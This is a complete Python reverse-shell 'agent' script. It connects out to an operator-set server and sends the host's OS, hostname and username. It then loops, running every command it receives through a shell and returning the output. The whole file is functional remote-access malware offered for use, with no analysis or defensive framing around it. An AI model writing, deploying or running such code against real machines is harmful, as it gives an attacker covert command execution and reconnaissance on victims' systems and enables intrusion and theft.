# Agent script

import socket
import subprocess


SERVER_HOST = '127.0.0.1'  # Change this to your server's IP
SERVER_PORT = 5555

def get_info():
    import getpass
    import platform

    os = platform.platform()
    hostname = platform.node()
    username = getpass.getuser()

    return f'\n[+] OS: {os} \n[+] Hostname: {hostname} \n[+] Username: {username}'


def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return str(e.output.decode())


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))
print("[+] Connected to server")
#send system info
s.send(get_info().encode())



while True:
    command = s.recv(1024).decode().strip()
    if command.lower() == "exit":
        break

    result = execute_command(command)
    if not result.strip():  # Check if result is empty after stripping whitespace
        result = "[+] Command executed successfully, but produced no output"
    
    s.send(result.encode())


